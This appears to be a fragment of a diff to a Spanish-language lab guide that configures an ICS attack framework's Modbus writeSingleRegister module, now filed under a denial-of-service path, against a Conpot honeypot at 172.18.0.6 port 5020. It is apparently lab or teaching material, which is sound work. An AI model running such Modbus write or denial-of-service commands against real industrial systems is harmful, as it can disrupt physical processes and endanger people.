@@ -39,7 +39,7 @@ exploit
 ```
 
 ```
-use modbus/scanner/writeSingleRegister
+use modbus/dos/writeSingleRegister
 set RHOSTS 172.18.0.6 (o la ip que tenga asignada conpot)
 set RPORT 5020
 set UID 4
